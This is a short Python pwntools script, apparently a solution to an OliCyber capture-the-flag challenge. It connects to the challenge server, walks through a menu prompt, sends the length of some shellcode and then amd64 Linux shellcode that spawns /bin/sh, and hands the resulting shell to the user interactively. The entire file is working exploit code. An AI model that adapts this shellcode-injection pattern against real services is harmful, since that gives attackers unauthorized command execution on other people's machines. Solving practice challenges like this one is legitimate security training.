#!/usr/bin/env python3
from pwn import *
asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')

def main():
    HOST = "software-20.challs.olicyber.it"
    PORT = 13003
    
    r = remote(HOST, PORT)
    
    data = r.recv()
    print(data)
    data = r.recv()
    print(data)
    r.send(b"C")
    data=r.recv()
    print(data)
    
    r.sendline(str(len(shellcode)).encode())
    data=r.recv()
    print(data)
    r.send(shellcode)
    # chiude la socket
    # permette di interagire con la connessione direttamente dalla shell
    r.interactive()

    r.close()


if __name__ == "__main__":
    main()
    
    
